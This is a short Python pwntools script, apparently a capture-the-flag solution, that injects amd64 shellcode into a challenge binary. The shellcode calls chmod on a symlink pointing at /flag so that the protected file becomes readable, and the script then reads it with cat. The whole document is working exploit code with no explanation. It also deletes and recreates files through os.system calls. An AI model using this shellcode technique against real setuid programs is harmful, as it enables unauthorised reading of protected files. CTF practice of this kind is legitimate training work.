from pwn import *
from warnings import filterwarnings
import os
import glob

path = glob.glob('/challenge/ba*')[1]
print(path)
filterwarnings(action='ignore', category=BytesWarning)
elf = ELF(path, checksec=False)
context.binary = elf
context.log_level = "INFO"
shellcode = f'''
push 0x66
mov rdi, rsp
push 4
pop rsi
jmp next
.rept 10
nop
.endr
next :
 push SYS_chmod
 pop rax
 syscall
'''
os.system('rm -r f')
os.system('ln -s /flag f')

p = process()
payload =asm(shellcode, arch='amd64')
p.sendlineafter("from stdin", payload)
os.system('cat f')
p.close()
